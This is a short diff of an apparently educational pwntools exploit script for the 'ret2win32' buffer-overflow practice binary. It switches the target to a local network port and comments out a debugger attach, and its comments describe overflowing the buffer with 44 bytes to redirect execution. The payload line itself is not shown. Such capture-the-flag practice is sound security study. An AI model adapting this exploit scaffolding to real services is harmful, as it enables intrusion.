@@ -3,9 +3,10 @@
 from pwn import *
 context.bits = 32
 #opens up the warmup process
-pw = process("./ret2win32")
+#pw = process("./ret2win32")
+pw = remote("127.0.0.1", 5555)
 #attaches a gdb debugger to the program
-gdb.attach(pw, gdbscript = 'b *0x0804862c')
+#gdb.attach(pw, gdbscript = 'b *0x0804862c')
 #receives the input up until the ">"
 pw.recvuntil(b">")
 #the payload fills the buffer with 44  A's and adds it to the ret2win function.
